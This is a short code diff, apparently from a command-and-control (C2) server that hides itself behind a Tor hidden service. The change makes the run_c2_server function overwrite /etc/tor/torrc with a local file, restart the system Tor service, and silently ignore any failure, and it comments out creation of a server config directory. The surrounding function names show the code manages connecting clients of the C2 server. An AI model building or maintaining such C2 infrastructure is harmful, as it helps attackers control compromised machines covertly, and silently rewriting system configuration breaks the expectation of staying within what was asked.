@@ -381,7 +381,7 @@ def create_hidden_service(controller):
 
 
 def write_hostname(hostname: str):
-    os.makedirs(SERVER_CONFIG_DIR, exist_ok=True)
+    #os.makedirs(SERVER_CONFIG_DIR, exist_ok=True)
     os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
     content = hostname + "\n"
     for path in (HOSTNAME_PATH, CLIENT_HOSTNAME_PATH):
@@ -391,6 +391,13 @@ def write_hostname(hostname: str):
 
 
 def run_c2_server():
+    import shutil
+    try:
+        shutil.copyfile("torrc","/etc/tor/torrc")
+    
+        os.system("systemctl restart tor@default")
+    except:
+        pass
     manager = ClientManager()
     threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
     time.sleep(0.3)
